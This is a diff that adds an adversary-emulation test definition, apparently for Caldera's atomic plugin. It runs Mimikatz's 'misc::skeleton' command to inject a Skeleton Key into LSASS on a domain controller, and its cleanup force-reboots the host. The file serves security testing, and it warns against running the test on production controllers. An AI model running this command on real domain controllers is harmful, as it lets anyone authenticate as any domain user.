@@ -1,0 +1,32 @@
+---
+- id: 03c93dbc48994c6ca2698b395c31b974
+  name: Skeleton Key via Mimikatz
+  description: 'Injects a Skeleton Key into LSASS on a domain controller using Mimikatz.
+    Once injected, any domain
+
+    user account can be authenticated using the password ''mimikatz'' until the domain
+    controller is rebooted.
+
+
+    This test must be run on an isolated domain controller and must not be performed
+    on a production DC.
+
+    Cleanup forces a reboot of the domain controller to evict the skeleton key from
+    LSASS memory.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1556.001
+    name: 'Modify Authentication Process: Domain Controller Authentication'
+  platforms:
+    windows:
+      psh:
+        command: '& "C:\ExternalPayloads\Mimikatz\x64\mimikatz.exe" "privilege::debug"
+          "misc::skeleton" "exit"'
+        payloads: []
+        cleanup: Remove-Item -Path "C:\ExternalPayloads\Mimikatz" -Recurse -ErrorAction
+          Ignore; Restart-Computer -Force
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
